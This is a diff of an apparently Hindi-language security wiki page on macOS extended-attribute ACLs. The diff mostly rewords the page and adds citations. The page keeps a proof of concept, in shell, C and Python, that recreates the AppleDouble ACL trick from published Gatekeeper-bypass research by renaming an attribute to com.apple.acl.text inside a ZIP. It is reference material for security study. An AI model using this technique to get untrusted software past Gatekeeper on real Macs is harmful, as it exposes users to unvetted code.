@@ -1,6 +1,8 @@
-# macOS xattr-acls अतिरिक्त जानकारी
+# macOS xattr-acls अतिरिक्त सामग्री
 
 {{#include ../../../../banners/hacktricks-training.md}}
+
+निम्न proof of concept Achilles Gatekeeper bypass research में उपयोग की गई AppleDouble/ACL technique को फिर से बनाता है: यह एक ACL को extended attribute के रूप में serialize करता है, उसे AppleDouble file में सुरक्षित रखता है, attribute का नाम बदलकर `com.apple.acl.text` करता है, और `ditto` के साथ ZIP archive को फिर से बनाता है।<sup>[[1]](#references)[[2]](#references)</sup>
 ```bash
 rm -rf /tmp/test*
 echo test >/tmp/test
@@ -14,7 +16,7 @@ ACL in hex: \x21\x23\x61\x63\x6c\x20\x31\x0a\x67\x72\x6f\x75\x70\x3a\x41\x42\x43
 ```
 <details>
 
-<summary>get_acls का Code</summary>
+<summary>get_acls का कोड</summary>
 ```c
 // gcc -o get_acls get_acls
 #include <stdio.h>
@@ -57,7 +59,7 @@ return 0;
 ```
 </details>
 ```bash
-# Lets add the xattr com.apple.xxx.xxxx with the acls
+# Add the com.apple.xxx.xxxx extended attribute containing the ACL
 mkdir start
 mkdir start/protected
 ./set_xattr start/protected
@@ -65,7 +67,7 @@ echo something > start/protected/something
 ```
 <details>
 
-<summary>set_xattr का Code</summary>
+<summary>set_xattr का code</summary>
 ```c
 // gcc -o set_xattr set_xattr.c
 #include <stdio.h>
@@ -150,12 +152,12 @@ return 0;
 ```
 </details>
 ```bash
-# Create appledoublefile with the xattr entitlement
+# Create an AppleDouble file containing the extended attribute
 ditto -c -k start protected.zip
 rm -rf start
 # extract the files
 unzip protected.zip
-# Replace the name of the xattr here (if you put it before ditto would have destroyed it)
+# Replace the extended-attribute name here (ditto would otherwise remove com.apple.acl.text)
 python3 -c "with open('._protected', 'rb+') as f: content = f.read().replace(b'com.apple.xxx.xxxx', b'com.apple.acl.text'); f.seek(0); f.write(content); f.truncate()"
 # zip everything back together
 rm -rf protected.zip
@@ -169,4 +171,8 @@ rm ._*
 ditto -x -k --rsrc protected.zip .
 xattr -l protected
 ```
+## References
+
+- [1] [Microsoft Security Blog — Gatekeeper की Achilles heel: macOS vulnerability का पता लगाना](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)
+- [2] [Apple Developer — `ditto` के साथ distribution के लिए Mac software को package करना](https://developer.apple.com/documentation/xcode/packaging-mac-software-for-distribution)
 {{#include ../../../../banners/hacktricks-training.md}}
